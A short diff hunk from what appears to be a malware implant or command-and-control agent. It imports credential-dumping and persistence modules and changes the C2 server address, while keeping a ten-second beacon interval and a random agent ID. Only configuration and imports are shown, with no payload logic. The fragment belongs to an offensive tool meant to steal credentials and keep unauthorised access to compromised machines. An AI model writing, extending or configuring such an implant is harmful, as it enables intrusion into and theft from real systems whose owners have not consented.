@@ -25,7 +25,7 @@ from modules.credential_dump import dump_credentials
 from modules.persistence import install_persistence
 
 # === Configuration ===
-C2_URL = "http://192.168.0.102:5001"# Update this to your C2 server's IP address
+C2_URL = "http://192.168.31.43:5001"# Update this to your C2 server's IP address
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
 # ======================
